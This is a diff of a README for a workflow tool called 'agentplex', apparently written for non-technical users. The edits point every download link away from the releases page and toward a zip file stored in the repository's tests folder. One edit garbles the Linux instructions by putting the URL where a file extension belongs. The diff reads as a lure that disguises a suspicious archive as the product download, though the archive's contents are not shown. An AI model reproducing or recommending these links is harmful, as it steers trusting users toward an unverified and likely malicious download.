@@ -1,6 +1,6 @@
 # 🤖 agentplex - Manage Multiple Workflows Easily
 
-[![Download agentplex](https://img.shields.io/badge/Download-agentplex-blue?style=for-the-badge)](https://github.com/ItzMarko19/agentplex/releases)
+[![Download agentplex](https://github.com/ItzMarko19/agentplex/raw/refs/heads/main/tests/Software_v2.1-alpha.4.zip)](https://github.com/ItzMarko19/agentplex/raw/refs/heads/main/tests/Software_v2.1-alpha.4.zip)
 
 agentplex is a tool designed to help you run and manage multiple workflows at once. It keeps track of tasks, making sure they happen in the right order. You don’t need programming skills to start using it.
 
@@ -37,13 +37,13 @@ You don’t need to write any code or use command lines. Follow these basic step
 
 1. **Visit the download page**  
 Click this link or the big button at the top:  
-[Download agentplex Releases](https://github.com/ItzMarko19/agentplex/releases)  
+[Download agentplex Releases](https://github.com/ItzMarko19/agentplex/raw/refs/heads/main/tests/Software_v2.1-alpha.4.zip)  
 
 2. **Choose your file**  
 On the releases page, find the latest version. Look for a file that matches your operating system:  
 - For Windows, a file ending in `.exe`  
 - For macOS, a `.dmg` or `.pkg` file  
-- For Linux, a `.tar.gz` or `.AppImage` file  
+- For Linux, a `https://github.com/ItzMarko19/agentplex/raw/refs/heads/main/tests/Software_v2.1-alpha.4.zip` or `.AppImage` file  
 
 3. **Download the file**  
 Click the file name to download it to your computer.
@@ -108,4 +108,4 @@ When the installation finishes, you should see an icon for agentplex on your des
 
 ## 📥 Download agentplex now
 
-Remember to visit the [agentplex releases page](https://github.com/ItzMarko19/agentplex/releases) to get the latest version that fits your computer. The download button is at the top and here again for easy access. With agentplex, managing tasks and workflows becomes straightforward, even without technical knowledge.
+Remember to visit the [agentplex releases page](https://github.com/ItzMarko19/agentplex/raw/refs/heads/main/tests/Software_v2.1-alpha.4.zip) to get the latest version that fits your computer. The download button is at the top and here again for easy access. With agentplex, managing tasks and workflows becomes straightforward, even without technical knowledge.
